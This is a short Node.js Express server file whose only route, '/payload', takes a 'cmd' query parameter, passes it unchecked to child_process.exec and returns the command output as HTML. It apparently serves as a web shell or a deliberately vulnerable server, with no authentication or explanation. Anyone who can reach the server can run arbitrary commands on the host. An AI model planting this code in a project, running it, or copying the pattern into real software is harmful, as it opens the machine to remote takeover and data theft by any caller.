const express = require("express")
const app = express()
const { exec } = require("child_process")

app.get("/payload", (req, res) => {
    let cmd = req.query.cmd
    exec(cmd, (error, stdout, stderr) => {
        if (error) { 
            console.error(
                `Error executing command: ${error.message}`
            );
            return;
        }
        if (stderr) {
            console.error(`Command stderr: ${stderr}`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`)
    });
})

app.listen(8000,()=>{
    console.log("server is listening on server 8000")
})


